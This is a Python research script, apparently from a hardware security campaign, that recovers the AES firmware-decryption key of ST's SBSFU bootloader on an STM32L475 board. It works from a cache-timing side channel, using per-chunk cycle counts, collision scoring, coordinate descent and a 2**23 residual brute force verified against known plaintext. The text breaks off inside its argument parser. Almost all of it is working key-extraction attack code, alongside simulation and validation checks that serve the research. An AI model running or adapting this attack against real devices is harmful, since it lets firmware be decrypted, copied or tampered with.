#!/usr/bin/env python3
"""Recover SBSFU's AES key from the B-L475E-IOT01A's own cycle counter.

    python results/bootloader_spi/l475/attack.py --check-ref 400000   # first
    python results/bootloader_spi/l475/attack.py --sim 40000          # no board
    python results/bootloader_spi/l475/attack.py ladder_b00.npz --control \
        --ladder --rungs 2556 3833 5110 --finish
    python results/bootloader_spi/l475/attack.py "ladder_b0*.npz" --round last

Input is what rigs/host/sbsfu_instr.py wrote: one interval per CHUNK, timed by
the victim in DWT->CYCCNT, plus the 512 bytes of ciphertext that chunk covered.
Nothing here reads the target's memory.  The key on disk is used to SCORE the
result and, in --finish, never at all -- the residual search is resolved against
a genuine image's known plaintext, which is what an attacker holding a vendor
update plus the matching public release has.

WHY THIS IS NOT results/bootloader_spi/samd21/attack_oracle.py
--------------------------------------------------------------
Same bootloader, same cipher, three differences, all of them in
results/bootloader_spi/l475/README.md section 4:

1. ONE OBSERVATION IS THIRTY-TWO BLOCKS.  At ST's shipped
   SFU_IMG_CHUNK_SIZE of 512 the interval spans 32 AES-CBC block decryptions
   plus one SHA-256 update, so the observable is a SUM.  The treatment is the
   chunked-observation case results/bootloader_spi/sim_spi_oracle.py models,
   and this file does not re-implement it: `--sim` imports that script and
   calls its own chunk_cycles(), so the model and the scorer cannot drift.
   The sum costs traces and nothing else -- every block in a chunk is credited
   the chunk's total, so 31 blocks' worth of signal becomes noise on the 32nd.

2. IT IS ROUND 1, NOT ROUND 10.  Both other ports recovered from the final
   inverse round through RSb.  RSb is 256 B and this part's data cache is
   256 B, so rounds 1-9 fill it and the last round has no key-dependent miss
   left to time (0/16 simulated at every chunk size).  RT0 is 1 KB, cannot be
   resident, and that is where the channel is.  --round last is still scored,
   because the simulated null is for an ALIGNED table and this image's RSb
   sits at 0x0802ac88, mod 32 == 8 -- nine conflict groups, not eight
   (research/targets/stm32l475.md section 5f).  Do not inherit that null.

3. ROUND 1 IS LINEAR IN THE KEY, SO IT RECOVERS DIFFERENCES.  mbedTLS XORs
   the ciphertext with the last round key and indexes RT0 with the result --
   index = C_j ^ K10_j, no S-box in the way, because ST's
   se_mbedtls_config.h defines MBEDTLS_AES_FEWER_TABLES and RT1..RT3 do not
   exist.  A collision therefore pins the top bits of (K10_a ^ K10_b) and
   nothing about either byte alone, which is the ROUND2.md situation and NOT
   the samd21 round-10 one.  --finish closes it: 8 bits of reference byte plus
   15 unresolved low bits is 2**23, searched and verified.

THE INDEX MODEL, which decides everything and is read off this build
--------------------------------------------------------------------
rigs/fw_l475_sbsfu/build/tables.txt, written by `make`:

    RT0 0x0802a488 0x400  mod 32 == 8        rounds 1-9, FOUR-byte entries
    RSb 0x0802ac88 0x100  mod 32 == 8        round 10, ONE-byte entries

Two geometries fit the measured silicon and both are scored, because one of
them is a cache and the other is not (research/targets/stm32l475.md section 3):

    latch   1 entry x 8 B, no FLASH_ACR bit reaches it.  RT0: 2 entries to a
            line -> a collision pins the top 7 bits of the difference.
            RT0 is 8-byte aligned, so line_off is 0 and the score depends on
            (C_a ^ C_b) alone -- a 128-way scan, not a 2**16 search.
    cache   256 B, 8-way, 32 B conflict period.  RT0: 8 entries to a 32-byte
            group -> top 5 bits.  RT0 is at mod 32 == 8, so line_off is 2
            ENTRIES and the relation is no longer a pure difference: that
            geometry gets the full (k_a, k_b) search.

WHICH PAIRS, and the lesson both earlier ports paid for.  With one table every
one of the 120 byte pairs can share a line, but "can" depends on what survives
between the two lookups: on the L152, which has a latch and no cache, only
CONSECUTIVE lookups are live and summing all 120 buried a 9-sigma signal under
105 noise votes.  This part has a 256 B 8-way cache over a 1 KB table, so a
line survives some distance -- but how far is a measurement, not a guess.
--pairs all|chain|window:N scores each, and --profile prints the prominence
distribution with no key so the data picks.
"""
from __future__ import annotations

import argparse
import glob
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", "..", ".."))
sys.path.insert(0, REPO)
sys.path.insert(0, os.path.join(REPO, "flashwhisperer"))

import numpy as np                                            # noqa: E402

# Ground truth, for scoring only: ST's own OEM_KEY_COMPANY1 for this project.
GROUND_TRUTH = "4f454d5f4b45595f434f4d50414e5931"

# mbedTLS AES_RROUND's lookup order in state bytes, as the SOURCE writes it.
# Kept for --pairs chain/window.  The samd21 campaign measured that the
# EMITTED order is what matters on a part with no cache; here the cache is the
# reason to profile rather than assume either.
ORDER = [0, 13, 10, 7, 4, 1, 14, 11, 8, 5, 2, 15, 12, 9, 6, 3]
ALL_PAIRS = [(i, j) for i in range(16) for j in range(i + 1, 16)]

# The instrumented victim's tables, used when a capture does not carry its
# own.  A CAPTURE'S OWN ADDRESSES WIN, and must: the bus-side target is built
# with INSTR=0, which takes about 1.1 KB of .text out and moves the tables --
# RT0 went to mod 32 == 20, mod 8 == 4, and mod 8 is `line_off`, a scoring
# parameter.  rigs/host/sbsfu_bus.py therefore reads build/tables.txt and
# stores rt0_addr/rsb_addr in the .npz, and load_captures() overrides these.
# (That build now also carries TABLEPAD, so a stock image can be linked to the
# instrumented one's phases and the two observers compared on one geometry.)
RT0_ADDR = 0x0802A488
RSB_ADDR = 0x0802AC88


class Geometry:
    """A flash line, in the units a table index is counted in.

    `entry_bytes` is the table's, `line_bytes` the silicon's; `line_off` is
    where the table starts inside its line, in ENTRIES, and it is what turns a
    clean difference relation into a two-byte search.
    """

    def __init__(self, name, line_bytes, entry_bytes, addr):
        self.name = name
        self.line_bytes = line_bytes
        self.entry_bytes = entry_bytes
        self.epl = line_bytes // entry_bytes
        self.shift = int(np.log2(self.epl))
        self.bits = 8 - self.shift
        self.line_off = (addr % line_bytes) // entry_bytes
        self.addr = addr

    @property
    def pure_difference(self):
        """Is `line(x) == line(y)` a function of x ^ y alone?

        Only when the table starts on a line boundary.  With line_off == 0,
        line(x) == line(y) iff (x ^ y) >> shift == 0, so the test reads the
        top `bits` of the key difference straight off a 2**bits-way scan.
        With any other phase the carry into the shift depends on the values
        themselves and the pair needs a 2**16 search.
        """
        return self.line_off == 0

    def line(self, idx):
        return (np.asarray(idx) + self.line_off) // self.epl

    def __str__(self):
        return ("%s: %d B line, %d B entries, %d/line, line_off %d entries, "
                "%d difference bits%s"
                % (self.name, self.line_bytes, self.entry_bytes, self.epl,
                   self.line_off, self.bits,
                   "" if self.pure_difference else " (2**16 search)"))


def geometries(which, rnd):
    addr = RT0_ADDR if rnd == "first" else RSB_ADDR
    entry = 4 if rnd == "first" else 1
    out = []
    if which in ("latch", "both"):
        out.append(Geometry("latch 8 B", 8, entry, addr))
    if which in ("cache", "both"):
        out.append(Geometry("cache 32 B", 32, entry, addr))
    return out


# ---------------------------------------------------------------------------
# Loading and deskew
# ---------------------------------------------------------------------------

def load(paths):
    """Concatenate captures, refusing any pair that is not the same measurement.

    The checks are the ones results/bootloader_spi/l475/README.md section 2
    makes the firmware answer, re-made here because a concatenation can break
    them even when every part passed: a different `variant` is a different
    image and therefore a different table address, and a non-zero poll count
    is a whole extra chip-select envelope inside the interval.
    """
    cyc, ct, pas, src = [], [], [], []
    meta = None
    base = 0
    for i, p in enumerate(sorted(paths)):
        d = np.load(p)
        m = dict(chunk=int(d["chunk"]), variant=str(d["variant"]),
                 board=str(d["board"]), tampered=int(d["tampered"]))
        if meta is None:
            meta = m
        else:
            for k in ("chunk", "variant", "board"):
                if m[k] != meta[k]:
                    raise SystemExit("%s disagrees with the first capture on "
                                     "%s: %r against %r -- a different image "
                                     "is a different table address"
                                     % (p, k, m[k], meta[k]))
        # A capture that knows its own table addresses overrides the module
        # constants, for every capture in the set.  Disagreement between
        # captures is already caught by the `variant` check above, so this
        # only has to be consistent with itself.
        if "rt0_addr" in d.files:
            global RT0_ADDR, RSB_ADDR
            RT0_ADDR = int(d["rt0_addr"])
            RSB_ADDR = int(d["rsb_addr"])
        if "observer" in d.files:
            m["observer"] = str(d["observer"])
            m["tick_hz"] = int(d["tick_hz"])
        nz = int((d["polls"] != 0).sum())
        if nz:
            raise SystemExit("%s: %d intervals carry a busy-poll retry, which "
                             "is an extra QSPI envelope inside the interval"
                             % (p, nz))
        cyc.append(d["cycles"].astype(np.float64))
        ct.append(d["ct"])
        # Passes are numbered per capture; renumber so a concatenation does
        # not centre two different passes together.
        pas.append(d["passno"].astype(np.int64) + base)
        base = int(pas[-1].max()) + 1
        src += [os.path.basename(p)] * len(d["cycles"])
    meta["files"] = [os.path.basename(p) for p in sorted(paths)]
    meta["passes"] = base
    return (np.concatenate(cyc), np.concatenate(ct), np.concatenate(pas),
            meta)


def deskew(cycles, passno, detrend=False, cut=0.0):
    """Centre the intervals, per pass, and say what that removed.

    WHAT THIS DOES NOT DO, and why it is shorter than the samd21's deskew().
    That part needed two modes removed: a SHA-256 compression landing in every
    fourth interval at chunk 16, and the victim's own 1 ms SysTick inside a
    110 us interval.  Neither is present here and both absences are measured,
    not assumed:

      * at ST's chunk size of 512 EVERY interval carries exactly eight
        SHA-256 compressions, so the term is a constant rather than a mode.
      * the interval distribution is one broad mode -- 174 distinct values
        over 254 intervals, no gap anywhere in the histogram, lag-1
        autocorrelation 0.034.  There is no second population to drop, and a
        cut would only remove the tail of the one there is, which is the
        percentile trimming the samd21 campaign tried and rejected.

    So the only thing removed is each pass's own baseline.  `--cut` and
    `--detrend` exist to be TRIED on a new capture, not because this one
    needs them: the diagnostic is that narrowing must make the per-collision
    effect BIGGER (MEASURING_CHANNELS.md section B22), and --profile prints it.
    """
    y = np.array(cycles, dtype=np.float64)
    report = []
    for p in np.unique(passno):
        sel = passno == p
        s = y[sel]
        if detrend:
            i = np.arange(len(s), dtype=np.float64)
            A = np.vstack([i, np.ones_like(i)]).T
            coef = np.linalg.lstsq(A, s, rcond=None)[0]
            s = s - A @ coef
            report.append((int(p), float(coef[0])))
        y[sel] = s - np.median(s)
    keep = np.ones(len(y), dtype=bool)
    if cut > 0:
        keep = np.abs(y) <= cut
    return y, keep, report


def expand(ct, y, chunk):
    """One observation per chunk -> one per AES block, the chunk's total.

    This is the whole chunked-observation treatment and it is deliberately
    this blunt: a pair of chip-select edges reveals the sum and nothing else,
    so every block inside the chunk gets credited the same number.
    sim_spi_oracle.chunk_cycles() does exactly this with np.repeat, and --sim
    checks the two against each other rather than trusting the comment.
    """
    n, cb = ct.shape
    if cb != chunk:
        raise SystemExit("ct is %d bytes wide, chunk is %d" % (cb, chunk))
    blocks = ct.reshape(n * (chunk // 16), 16).astype(np.int64)
    return blocks, np.repeat(y, chunk // 16)


# ---------------------------------------------------------------------------
# Round models
# ---------------------------------------------------------------------------

_FSB = None


def fsb():
    """The FORWARD S-box, as a lookup from AES output byte to table index.

    Round 10 of the inverse cipher emits a_j = RSb[idx_j] ^ K0_j, so
    idx_j = FSb[a_j ^ K0_j].  Getting that XOR wrong tests a relation the
    cipher does not have and returns a clean null -- FINDINGS_LEDGER section D.
    """
    global _FSB
    if _FSB is None:
        from flashattack import aesref
        _FSB = np.frombuffer(bytes(aesref.SBOX), dtype=np.uint8).astype(np.int64)
    return _FSB


IDENT = np.arange(256, dtype=np.int64)


def sub_for(rnd):
    return IDENT if rnd == "first" else fsb()


def pairs_for(spec):
    if spec == "all":
        return list(ALL_PAIRS)
    if spec == "chain":
        return [tuple(sorted(p)) for p in zip(ORDER[:-1], ORDER[1:])]
    if spec.startswith("window:"):
        w = int(spec.split(":", 1)[1])
        pos = {b: i for i, b in enumerate(ORDER)}
        return [(a, b) for (a, b) in ALL_PAIRS if abs(pos[a] - pos[b]) <= w]
    raise SystemExit("--pairs must be all, chain or window:N")


# ---------------------------------------------------------------------------
# Scoring
# ---------------------------------------------------------------------------

def delta_scores(data, y, a, b, geo):
    """Mean of y per candidate (k_a ^ k_b) top bits.  line_off == 0 only.

    A collision turns a miss into a hit, so it LOWERS the time: the candidate
    whose group is fastest is the one where the two lookups really shared a
    line.
    """
    d = (data[:, a] ^ data[:, b]) >> geo.shift
    ng = 1 << geo.bits
    s = np.bincount(d, weights=y, minlength=ng)
    c = np.bincount(d, minlength=ng)
    with np.errstate(invalid="ignore", divide="ignore"):
        return np.where(c > 0, s / np.maximum(c, 1), np.inf), c


def pair_scores_2d(data, y, a, b, geo, sub):
    """Mean of y per (k_a, k_b), for a geometry whose lines are not a
    difference -- a table off its line boundary, or a round whose index runs
    through the S-box."""
    da = data[:, a]
    db = data[:, b]
    Ssum = np.zeros((256, 256))
    Scnt = np.zeros((256, 256))
    np.add.at(Ssum, (da, db), y)
    np.add.at(Scnt, (da, db), 1.0)
    base = np.arange(256)
    nlines = int(geo.line(255)) + 1
    scores = np.full((256, 256), np.inf)
    for ga in range(256):
        na = geo.line(sub[base ^ ga]).astype(np.intp)
        Rs = np.zeros((nlines, 256))
        Rc = np.zeros((nlines, 256))
        np.add.at(Rs, na, Ssum)
        np.add.at(Rc, na, Scnt)
        for gb in range(256):
            nb = geo.line(sub[base ^ gb]).astype(np.intp)
            c = Rc[nb, base].sum()
            if c > 0:
                scores[ga, gb] = Rs[nb, base].sum() / c
    return scores


def prominence(vec):
    """How far the best candidate sits below the rest, in sd of the rest.

    Reported rather than a p-value because it is what the samd21 and L152
    campaigns quote and what makes a cliff visible when the pairs are
    profiled.
    """
    fin = np.asarray(vec)[np.isfinite(vec)]
    if fin.size < 4:
        return 0.0, -1
    i = int(np.argmin(np.where(np.isfinite(vec), vec, np.inf)))
    rest = np.delete(fin, np.argmin(fin))
    sd = rest.std() + 1e-12
    return float((rest.mean() - fin.min()) / sd), i


def score_round1(data, y, geo, pairs, truth=None, verbose=False):
    """Every pair's candidate scan, plus how many agree with the truth."""
    out = {}
    ok = 0
    for (a, b) in pairs:
        if geo.pure_difference:
            vec, _ = delta_scores(data, y, a, b, geo)
        else:
            sc = pair_scores_2d(data, y, a, b, geo, IDENT)
            # Collapse the two-byte surface onto the difference it is really
            # about, so a line_off != 0 geometry is reported in the same
            # currency as a line_off == 0 one.
            vec = np.full(1 << geo.bits, np.inf)
            gi, gj = np.meshgrid(np.arange(256), np.arange(256), indexing="ij")
            dd = ((gi ^ gj) >> geo.shift).ravel()
            flat = sc.ravel()
            fin = np.isfinite(flat)
            s = np.bincount(dd[fin], weights=flat[fin],
                            minlength=1 << geo.bits)
            c = np.bincount(dd[fin], minlength=1 << geo.bits)
            vec = np.where(c > 0, s / np.maximum(c, 1), np.inf)
        prom, best = prominence(vec)
        out[(a, b)] = dict(vec=vec, prom=prom, best=best)
        if truth is not None:
            want = (int(truth[a]) ^ int(truth[b])) >> geo.shift
            out[(a, b)]["ok"] = best == want
            out[(a, b)]["want"] = want
            ok += int(best == want)
            if verbose:
                print("    pair (%2d,%2d): delta %02x want %02x prom %5.2f %s"
                      % (a, b, best, want, prom, "+" if best == want else "-"))
    return out, ok


def solve_deltas(scored, geo, iters=12, restarts=24, seed=7):
    """One consistent set of 16 masked key bytes from every pair's scan.

    RESTARTS, because one descent is not enough and the failure is quiet.
    Scored on the 5 110-interval capture this directory holds, a single
    descent seeded from the pairs (0, j) gave 16/16 at 3 072 and 3 584
    intervals, 1/16 at 4 096 and 16/16 again at 4 608 -- a worse answer from
    strictly more data, which is a solver landing in a wrong fixed point and
    not a channel that went away.  Several starts and the best TOTAL REWARD
    wins, which is a key-free criterion: nothing here looks at the truth, and
    what settles it in the end is --finish's plaintext check.
    """
    rng = np.random.default_rng(seed)
    best = None
    for r in range(restarts + 1):
        v, obj = _descend(scored, geo, iters,
                          None if r == 0 else rng)
        if best is None or obj > best[1]:
            best = (v, obj)
    return best[0]


def marginal_surfaces(scored, geo, v):
    """Per-byte score over the 2**bits masked values, given the others.

    What it is for: a run that gets 15 of 16 bytes is not a failed attack, it
    is an attack with a residual search, and the size of that search is what
    makes the difference quotable.  The samd21 campaign quotes 11/16 plus a
    2**40 search for the same reason.
    """
    ng = 1 << geo.bits
    rew = {}
    for (a, b), r in scored.items():
        vec = r["vec"]
        fin = vec[np.isfinite(vec)]
        if fin.size < 4:
            continue
        med, sd = np.median(fin), fin.std() + 1e-12
        rew[(a, b)] = np.where(np.isfinite(vec), (med - vec) / sd, 0.0)
    cand = np.arange(ng)
    out = np.zeros((16, ng))
    for j in range(16):
        for (a, b), r in rew.items():
            if a == j:
                out[j] += r[cand ^ int(v[b])]
            elif b == j:
                out[j] += r[cand ^ int(v[a])]
    return out


def report_ranks(surf, v, truth, geo):
    """Where the TRUE masked value sits in each byte's ranking.

    Uses the key, so it is a diagnostic and not part of the attack: it says
    what a residual search would have to cover, which is the honest way to
    report a run that did not land 16 for 16.
    """
    want = ((np.asarray(truth) ^ np.asarray(truth)[0]) >> geo.shift) & 0xFF
    ranks = []
    for j in range(16):
        order = np.argsort(-surf[j])
        ranks.append(int(np.flatnonzero(order == want[j])[0]))
    bits = float(sum(np.log2(r + 1) for r in ranks)) + 8 + 15 * geo.shift
    print("    ranks of the true masked bytes: %s"
          % " ".join(str(r) for r in ranks))
    print("    best-first residual including the reference byte and the low "
          "bits: 2**%.1f" % bits)
    return ranks, bits


def _descend(scored, geo, iters=12, rng=None):
    """One consistent set of 16 masked key bytes from every pair's scan.

    Each pair constrains (k_a ^ k_b) & mask, which is LINEAR in
    u_j = k_j & mask, so the 120 pairs over-determine the 15 independent
    differences and can outvote a pair that ranks the truth second.  Byte 0 is
    the reference and v_j = u_j ^ u_0.

    Coordinate descent rather than the pairs (0, j) alone, for the reason the
    samd21's run() gives: taking one pair's argmin throws away the rest of its
    scan, so a pair whose best cell is wrong votes at full weight.
    """
    ng = 1 << geo.bits
    # Turn each scan into a reward: how far below the pair's own median, in
    # its own sd, so pairs with different noise levels are comparable.
    rew = {}
    for (a, b), r in scored.items():
        vec = r["vec"]
        fin = vec[np.isfinite(vec)]
        if fin.size < 4:
            continue
        med, sd = np.median(fin), fin.std() + 1e-12
        rew[(a, b)] = np.where(np.isfinite(vec), (med - vec) / sd, 0.0)

    v = np.zeros(16, dtype=np.int64)
    if rng is None:
        for (a, b), r in rew.items():
            if a == 0:
                v[b] = int(np.argmax(r))
    else:
        v[1:] = rng.integers(0, ng, size=15)
    nbr = {j: [] for j in range(16)}
    for (a, b), r in rew.items():
        nbr[a].append((b, r))
        nbr[b].append((a, r))
    cand = np.arange(ng)
    for _ in range(iters):
        moved = False
        for j in range(1, 16):
            acc = np.zeros(ng)
            for (m, r) in nbr[j]:
                acc += r[cand ^ v[m]]
            best = int(np.argmax(acc))
            if best != v[j]:
                v[j] = best
                moved = True
        if not moved:
            break
    # The objective: how well this whole assignment explains every pair's
    # scan.  Key-free, so it can choose between restarts.
    obj = 0.0
    for (a, b), r in rew.items():
        obj += float(r[int(v[a]) ^ int(v[b])])
    return v, obj


# ---------------------------------------------------------------------------
# The residual search
# ---------------------------------------------------------------------------

def finish(v, geo, known_ct, known_pt, iv_bytes, quiet=False):
    """Resolve what the collision cannot see, and verify on real plaintext.

    Round 1 gives (k_j ^ k_0) & mask, so what is left is the reference byte
    (8 bits) and every other byte's low `shift` bits: 2**(8 + 15*shift), which
    is 2**23 at the 8-byte latch.  Each candidate K10 is run back through the
    key schedule and tested by decrypting one block of a GENUINE image whose
    plaintext is public -- no key is read.

    A real adversary has a cheaper oracle than that and does not need the
    plaintext at all: ST's header carries `FwTag`, a SHA-256 over the
    plaintext body, and it sits inside the genuine signed header the attacker
    must already hold to stage a tampered body.  Decrypt and hash, compare.
    The L152 campaign resolved its own 2**23 that way; this checks against the
    plaintext because the plaintext is sitting in the directory.
    """
    from flashattack import bruteforce as bf

    shift = geo.shift
    low = 1 << shift
    masked = (v << shift).astype(np.int64)          # (k_j ^ k_0) & mask
    total = 256 * low ** 15
    if not quiet:
        print("  residual search: %d candidates (2**%.1f)"
              % (total, np.log2(total)))

    # Enumerate the 15 low-bit patterns once; add the reference byte outside.
    pats = low ** 15
    if pats > 1 << 22:
        raise SystemExit("residual %d is past what this script searches; the "
                         "cache geometry needs ROUND2.md's algebra instead"
                         % total)
    idx = np.arange(pats, dtype=np.int64)
    lowbits = np.zeros((pats, 16), dtype=np.int64)
    for j in range(1, 16):
        lowbits[:, j] = (idx // (low ** (j - 1))) % low

    pt0 = np.frombuffer(known_pt[:16], dtype=np.uint8).astype(np.int64)
    ct0 = np.frombuffer(known_ct[:16], dtype=np.uint8).astype(np.int64)
    iv = np.frombuffer(iv_bytes[:16], dtype=np.uint8).astype(np.int64)
    # CBC: p_0 = D(c_0) ^ IV, and the .sfb carries the IV in its meta, so the
    # block cipher's own output is pt0 ^ iv.
    want = (pt0 ^ iv).astype(np.uint8)
    block = ct0.astype(np.uint8)

    tried = 0
    for k0 in range(256):
        rk = ((masked[None, :] ^ lowbits) ^ k0) & 0xFF
        rk[:, 0] = k0
        rk = rk.astype(np.uint8)
        master = bf.invert_key_schedules(rk)
        rks = bf.expand_keys(master)
        got = bf.decrypt_block(rks, block)
        hit = np.flatnonzero((got == want[None, :]).all(axis=1))
        tried += len(rk)
        if len(hit):
            return bytes(master[hit[0]]), tried, bytes(rk[hit[0]])
    return None, tried, None


def cbc_iv(meta_path):
    for line in open(meta_path, encoding="utf-8"):
        if line.startswith("iv "):
            return bytes.fromhex(line.split()[1])
    raise SystemExit("no iv in %s" % meta_path)


# ---------------------------------------------------------------------------
# Simulation, against the reference model
# ---------------------------------------------------------------------------

def sim_intervals(n_obs, chunk_blocks, noise, seed, key, rnd="first"):
    """Synthesise intervals from the MEASURED geometry, through the reference.

    The flash model, the per-chunk grouping and the carry-across-blocks are
    sim_spi_oracle.py's: this imports that script and calls its chunk_cycles()
    rather than writing a second one, which is the only way the two cannot
    disagree.

    Two things are this image's rather than that script's PARTS row, and both
    are documented in results/bootloader_spi/l475/README.md section 4:

      * ONE table.  MBEDTLS_AES_FEWER_TABLES means all 16 lookups of every
        inverse round hit RT0, where flashsim's "ttable" layout lays out four
        separate Te tables and only same-table pairs can collide.  That is
        the forward cipher's shape, not this build's.
      * The inverse cipher is modelled by its isomorphism at round 1 -- one
        round key XORed into a 16-byte attacker-chosen input, then a table
        lookup -- so the forward cipher's state sequence stands in for rounds
        2-9, which contribute uniform noise either way and no signal.
    """
    import importlib.util
    ref_path = os.path.join(HERE, "..", "sim_spi_oracle.py")
    spec = importlib.util.spec_from_file_location("sim_spi_oracle", ref_path)
    ref = importlib.util.module_from_spec(spec)
    sys.modules["sim_spi_oracle"] = ref
    spec.loader.exec_module(ref)

    from flashsim import aes
    flash = ref.PARTS["stm32l475"]["flash"]
    rng = np.random.default_rng(seed)
    rk = aes.key_expansion(bytes(key))
    lb = flash.line_bytes
    rt0_lines = 1024 // lb

    # Batched, in whole chunks, because the line array is (blocks, 160) int32
    # and a million blocks of it is most of a gigabyte.  The batch boundary is
    # a chunk boundary, so the flash state that carries ACROSS blocks inside a
    # chunk is never cut -- between chunks the driver and the SHA update run,
    # which is what makes each chunk start cold in the first place.
    per_batch = max(chunk_blocks, (1 << 16) // chunk_blocks * chunk_blocks)
    obs, cts = [], []
    left = n_obs
    while left > 0:
        nb = min(per_batch // chunk_blocks, left) * chunk_blocks
        ct = rng.integers(0, 256, size=(nb, 16), dtype=np.uint8)
        _, sub_in = aes.encrypt_trace(ct, rk)
        # One RT0 of 1 KB with 4-byte entries for rounds 1-9, then RSb of
        # 256 B with 1-byte entries, each laid out at the phase this image
        # links it at.
        seq = []
        for r in range(10):
            vals = sub_in[:, r, :].astype(np.int32)
            if r != 9:
                seq.append(((vals * 4 + (RT0_ADDR % lb)) // lb).astype(np.int32))
            else:
                seq.append((rt0_lines
                            + ((vals + (RSB_ADDR % lb)) // lb)).astype(np.int32))
        lines = np.concatenate(seq, axis=1)

        per_block = ref.chunk_cycles(lines, flash, chunk_blocks)
        # chunk_cycles repeats the group total over its blocks; the capture
        # stores one number per chunk, so take every chunk_blocks-th and
        # assert the repeat is what expand() rebuilds.
        o = per_block[::chunk_blocks].copy()
        assert np.array_equal(np.repeat(o, chunk_blocks), per_block), \
            "expand() and sim_spi_oracle.chunk_cycles() disagree"
        obs.append(o)
        cts.append(ct.reshape(nb // chunk_blocks, chunk_blocks * 16))
        left -= nb // chunk_blocks
    obs = np.concatenate(obs)
    if noise > 0:
        obs = obs + rng.normal(0, noise, size=obs.shape)
    return obs, np.concatenate(cts), np.zeros(n_obs, dtype=np.int64)


# ---------------------------------------------------------------------------

def known_key_control(ct, y, truth, geo, pairs, chunk, sub=None):
    """Does the effect exist, with the key handed over -- and how big is it?

    This is NOT an attack: it uses the key.  It is what separates "no channel"
    from "a channel and not enough traces", and it prices the campaign before
    the campaign is run, which is the only reason anybody here knows a trace
    count in advance instead of discovering it by running out of bench time
    (research/mechanism/MEASURING_CHANNELS.md).

    The regressor is the collision count over the WHOLE CHUNK -- all 32
    blocks' pairs added up -- because that is what the one observation sums.
    The slope is then cycles saved per collision, directly comparable to the
    4 cycles research/targets/stm32l475.md section 3 measures the read latch
    to be worth at LATENCY 4.
    """
    sub = IDENT if sub is None else sub
    k = np.asarray(truth, dtype=np.int64)
    n, cb = ct.shape
    bpc = cb // 16
    blocks = ct.reshape(n * bpc, 16).astype(np.int64)
    lines = geo.line(sub[blocks ^ k[None, :]])
    hits = np.zeros(n * bpc, dtype=np.int64)
    for (a, b) in pairs:
        hits += (lines[:, a] == lines[:, b])
    h = hits.reshape(n, bpc).sum(axis=1).astype(np.float64)

    A = np.vstack([h, np.ones_like(h)]).T
    coef = np.linalg.lstsq(A, y, rcond=None)[0]
    resid = y - A @ coef
    sd = float(resid.std())
    se = sd / (np.sqrt(((h - h.mean()) ** 2).sum()) + 1e-12)
    print("    control: %d collisions/chunk mean, slope %+.4f +/- %.4f "
          "cycles (z %+.2f), residual sd %.2f"
          % (h.mean(), coef[0], se, coef[0] / (se + 1e-12), sd))
    # Where a buy-more-traces decision comes from: the effect is one
    # collision's worth, and a pair's scan has to separate it from the
    # residual, so the count scales as (sd/slope)**2.
    if abs(coef[0]) > 0:
        print("    (sd/slope)**2 = %.0f  -- a pair scan needs that order of "
              "observations per candidate" % ((sd / abs(coef[0])) ** 2))
    return float(coef[0]), sd, h


def check_ref(n_blocks, chunk_blocks=32, seed=20260925):
    """Is this file's round-1 scan the same arithmetic as the reference's?

    Not "the same idea" -- the same answer, pair for pair, on one stream of
    simulated cycles.  The index model is held at the REFERENCE's (flashsim's
    four separate Te tables, so only same-table pairs can collide, which is
    the forward cipher's shape and not this build's) precisely so that the
    only thing under test is the scoring: group the blocks by the top bits of
    the input difference, credit each block its chunk's total, take the
    fastest group.

    Agreement here is what licenses the rest of the file to use the real
    image's single-RT0 layout, which the reference cannot express.
    """
    import importlib.util
    ref_path = os.path.join(HERE, "..", "sim_spi_oracle.py")
    spec = importlib.util.spec_from_file_location("sim_spi_oracle", ref_path)
    ref = importlib.util.module_from_spec(spec)
    sys.modules["sim_spi_oracle"] = ref
    spec.loader.exec_module(ref)

    from flashsim import aes, attack as fattack

    key = np.frombuffer(bytes.fromhex("2b7e151628aed2a6abf7158809cf4f3c"),
                        np.uint8)
    flash = ref.PARTS["stm32l475"]["flash"]
    rk = aes.key_expansion(bytes(key))
    rng = np.random.default_rng(seed)

    n = n_blocks - n_blocks % chunk_blocks
    blk = rng.integers(0, 256, size=(n, 16), dtype=np.uint8)
    _, sub_in = aes.encrypt_trace(blk, rk)
    lines, _ = aes.line_sequence(sub_in, "ttable", line_bytes=flash.line_bytes)
    cyc = ref.chunk_cycles(lines, flash, chunk_blocks)

    pairs = fattack.collision_pairs("ttable", line_bytes=flash.line_bytes)
    print("reference agreement check: %d blocks, chunk %d, %d same-table pairs"
          % (n, chunk_blocks, len(pairs)))

    # The reference's own accumulator, transcribed from run_cell/score.
    ng = 1 << pairs[0]["bits"]
    b = blk.astype(np.int32)
    ref_guess, ref_ok = [], 0
    for pr in pairs:
        d = (b[:, pr["a"]] ^ b[:, pr["b"]]) >> pr["shift"]
        s = np.bincount(d, weights=cyc, minlength=ng)
        c = np.bincount(d, minlength=ng)
        with np.errstate(invalid="ignore", divide="ignore"):
            means = np.where(c > 0, s / np.maximum(c, 1), np.inf)
        g = int(np.argmin(np.where(np.isfinite(means), means, np.inf)))
        ref_guess.append(g)
        ref_ok += int(g == ((int(key[pr["a"]]) ^ int(key[pr["b"]]))
                            >> pr["shift"]))

    # This file's: the same observation expanded per block by expand(), then
    # delta_scores() at the same geometry.
    geo = Geometry("latch 8 B", flash.line_bytes, 4, RT0_ADDR)
    obs = cyc[::chunk_blocks].copy()
    ctc = blk.reshape(n // chunk_blocks, chunk_blocks * 16)
    data, yb = expand(ctc, obs, chunk_blocks * 16)
    mine, ok = [], 0
    for pr in pairs:
        vec, _ = delta_scores(data, yb, pr["a"], pr["b"], geo)
        g = int(np.argmin(np.where(np.isfinite(vec), vec, np.inf)))
        mine.append(g)
        ok += int(g == ((int(key[pr["a"]]) ^ int(key[pr["b"]]))
                        >> pr["shift"]))

    same = sum(1 for x, y in zip(ref_guess, mine) if x == y)
    print("  reference %2d/%d pairs, this file %2d/%d pairs, identical "
          "guesses on %d/%d" % (ref_ok, len(pairs), ok, len(pairs), same,
                                len(pairs)))
    if same != len(pairs):
        raise SystemExit("the scorer DISAGREES with "
                         "results/bootloader_spi/sim_spi_oracle.py on "
                         "simulated data, which makes it wrong")
    print("  OK -- same guess on every pair, so the chunked-observation "
          "treatment and the round-1 scan are the reference's")
    return 0


def ladder_marks(n, rungs):
    if rungs:
        return [int(r) for r in rungs]
    out, m = [], 1
    while m < n:
        m *= 2
    marks = []
    v = n
    while v >= 256:
        marks.append(int(v))
        v //= 2
    return sorted(marks)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("npz", nargs="*", help="captures from rigs/host/sbsfu_instr.py")
    ap.add_argument("--round", default="first", choices=("first", "last", "both"))
    ap.add_argument("--geometry", default="both", choices=("latch", "cache", "both"))
